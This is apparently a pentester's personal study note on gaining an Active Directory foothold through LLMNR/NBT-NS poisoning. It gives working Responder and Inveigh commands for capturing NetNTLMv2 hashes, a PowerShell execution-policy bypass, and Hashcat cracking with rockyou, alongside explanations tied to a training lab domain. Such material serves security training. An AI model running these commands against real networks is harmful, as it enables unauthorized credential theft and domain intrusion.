---
title: AD Initial Foothold
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - foothold
---
 
> [!Goal]
>  Acquire valid cleartext credentials for a domain user account

> [!Requirements]
> - Privileged access to a host that belongs to a domain
> - Physical access to the host (connected through interface)

# LLMNR/NBT-NS Poisoning
[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\)?redirectedfrom=MSDN) (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. It uses port `5355` over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port `137` over UDP.

The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with `Responder` to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that's supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.

## Example
1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with `Responder` running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

---
# LLMNR/NBT-NS Poisoning from Linux
> [!Important]
> Responder has to be executed as **root**

Responder is a tool to listen and poison resolution requests:
```bash
+ PASSIVE MODE +
$ sudo responder -I INTERFACE -A

+ ACTIVE MODE +
$ sudo responder -I INTERFACE -wrf

Recommended scan:
$ sudo responder -I INTERFACE -wf


Parameters:
-I: interface
-A: analyze mode (check NBT-NS, BROWSER, and LLMNR requests without poisoning)
-w: start the WPAD rogue proxy server (it will capture all HTTP requests by any users that launch Internet Explorer if the browser has Auto-detect settings enabled. Useful for large orgs)
-f: attempt to fingerprint the remote host operating system and version
-v: verbosity (only if we have issues)
-F: force NTLM/Basic authentication (cause a login prompt like -P)
-P: force NTLM (transparently)/Basic (prompt) authentication for the proxy (highly effective with -r)
```

> [!Note]
> Hashes are stored in **/usr/share/responder/logs** directory with the following format:
> - (MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt
> 
> Example: SMB-NTLMv2-SSP-172.16.5.25

We can crack the hashes with Hashcat using mode **5600** for NTLMv2 hashes. For other hashes check the [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) web page. NetNTLMv2 hashes are very useful once cracked, but cannot be used for techniques such as pass-the-hash, meaning we have to attempt to crack them offline.

```bash
$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

---
# LLMNR/NBT-NS Poisoning from Windows
We are going to use a tool called Inveight (responder for Windows).
> [!Important]
> Powershell must be executed as administrator ()

- Load Inveight and list parameters:
```powershell
PS C:\> powershell -ep bypass
PS C:\> Import-Module .\Inveigh.ps1
PS C:\> (Get-Command Invoke-Inveigh).Parameters
```

> [!Note]
> There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.

- Start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file:
```powershell
PS C:\> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
PS C:\> Invoke-Inveigh -NBNS Y LLMNR Y -ConsoleOutput Y -FileOutput Y
```

- Start the C# Inveight version with a default scan:
```powershell
PS C:\> .\Inveigh.exe

*Press ESC to enter the interactive console*
HELP (display commands)
GET NTLMV2UNIQUE (view captured hashes)
GET NTLMV2USERNAMES (view collected usernames)
STOP (stop Inveight)
```

---
# Password Spraying

- Check [[AD Enumeration]] section for more information

# LDAP

Check [[LDAP]] enumeration section for more information

# RPC

Check [[content/Pentra/☠️ Classic Pentesting/1 - Information Gathering/Active Information Gathering/Services/RPC|RPC]] enumeration section for more information

# SMB

Check [[SMB]] enumeration section for more information